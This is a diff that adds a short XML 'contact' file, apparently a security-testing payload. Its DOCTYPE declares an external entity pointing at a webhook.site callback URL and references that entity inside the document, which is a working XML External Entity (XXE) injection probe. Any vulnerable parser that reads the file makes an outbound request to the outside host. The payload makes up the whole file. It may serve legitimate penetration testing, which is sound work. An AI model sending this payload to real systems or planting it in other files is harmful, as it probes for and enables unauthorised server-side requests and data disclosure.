@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+<!ENTITY bar SYSTEM "https://webhook.site/f0f0f9b4-0845-48f9-9939-aa43558a1529" >]>
+<contact>
+    <name>Luis Fontes</name>
+    <foo>&bar;</foo>
+</contact>
